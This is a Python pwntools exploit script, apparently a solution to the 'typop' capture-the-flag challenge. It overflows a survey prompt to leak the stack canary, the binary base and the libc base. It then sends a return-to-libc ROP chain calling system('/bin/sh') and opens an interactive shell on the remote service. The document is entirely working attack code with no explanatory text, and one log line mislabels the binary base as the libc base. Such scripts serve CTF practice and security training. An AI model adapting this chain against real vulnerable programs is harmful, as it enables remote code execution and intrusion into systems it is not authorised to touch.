from pwn import *

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)

if args.REMOTE:
   libc=ELF('./rlibc.so.6')
else:
   libc = e.libc

gs = '''
continue
'''


def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('typop.chal.idek.team', 1337)
    else:
        return process(e.path)


def leak_base():
    log.info("Leaking binary base")
    p.sendlineafter(b'Do you want to complete a survey?', b'y')
    p.sendlineafter(b'Do you like ctf?', b'A'*25)
    p.recvline()
    p.recvline()
    leak = u64(p.recvline().strip(b'\n').ljust(8, b'\x00'))
    e.address = leak-0x1447


def leak_canary():
    log.info("Leaking canary")
    p.sendlineafter(b'Do you want to complete a survey?', b'y')
    p.sendlineafter(b'Do you like ctf?', b'B'*10)
    print(p.recvline())
    print(p.recvline())
    leak = u64(p.recv(7).strip(b'\n').rjust(8, b'\x00'))
    canary_chain = b'C'*10+p64(leak)
    p.sendlineafter(
        b'Aww :( Can you provide some extra feedback?', canary_chain)
    return leak


def leak_libc(canary):
    r = ROP(e)
    chain = cyclic(10)
    chain += p64(canary)
    chain += cyclic(8)
    chain += p64(r.find_gadget(['pop rdi', 'ret'])[0])
    chain += p64(e.got['puts'])
    chain += p64(e.plt['puts'])
    chain += p64(e.sym['main'])
    p.sendlineafter(b'Aww :( Can you provide some extra feedback?', chain)
    p.recvline()
    leak = u64(p.recv(7).strip(b'\n').ljust(8, b'\x00'))
    libc.address = leak-libc.sym['puts']


def sploit(canary):
    r = ROP(libc)
    chain = cyclic(10)
    chain += p64(canary)
    chain += cyclic(8)
    chain += p64(r.find_gadget(['ret'])[0])
    chain += p64(r.find_gadget(['pop rdi', 'ret'])[0])
    chain += p64(next(libc.search(b'/bin/sh')))
    chain += p64(libc.sym['system'])
    p.sendlineafter(b'Do you want to complete a survey?', b'y')
    p.sendlineafter(b'Do you like ctf?', b'y')
    p.sendlineafter(b'extra feedback?', chain)


p = start()
canary = leak_canary()
log.info('Canary Leaked: 0x%x' % canary)
leak_base()
log.info('Base Leaked: 0x%x' % e.address)
leak_libc(canary)
log.info('Libc Base Leaked: 0x%x' % e.address)
sploit(canary)
p.interactive()
